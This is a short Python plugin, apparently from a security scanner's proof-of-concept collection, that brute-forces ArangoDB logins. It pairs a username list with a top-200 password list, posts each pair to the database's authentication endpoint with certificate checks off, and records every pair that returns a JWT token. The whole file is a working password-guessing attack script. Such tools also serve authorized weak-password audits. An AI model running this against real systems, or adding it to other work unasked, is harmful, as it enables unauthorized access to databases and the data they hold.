# coding: utf-8
# @Time    : 2020/9/21 6:33
# @Author    : WANSUIYE
# @File    : ArangoDBCheck.py
# @Project: kscan_pocs

import requests

from .utils.getFile import get_var_items,genUserPasswd

def get_dict(flag=1):
	user_list = get_var_items('ssh_user.txt')
	passwd_list = get_var_items('top200passwd.txt')

	return genUserPasswd(user_list, passwd_list)

def bf(target,user,passwd,timeout):
	url = '{}://{}:{}/_db/_system/_open/auth'.format(target[0], target[1], int(target[2]))
	retVal=''
	try:
		data = {"username": user, "password": passwd}
		res = requests.post(url, json=data, verify=False, timeout=timeout)
		if res.status_code ==200 and 'jwt' in res.text:
			retVal = '{}/{}'.format(user,passwd)
	except:
		pass
	return retVal

def check(target,**kwargs):
	timeout = kwargs.get('timeout') or 3
	flag = kwargs.get('flag') or 1
	retVal={'service':'ArangoDB','status':1,'url':''}

	for user, passwd in get_dict(flag):
		res = bf(target,user,passwd,timeout)
		if res:
			retVal['status'] = 2
			retVal['url'] += res+'\n'

	return retVal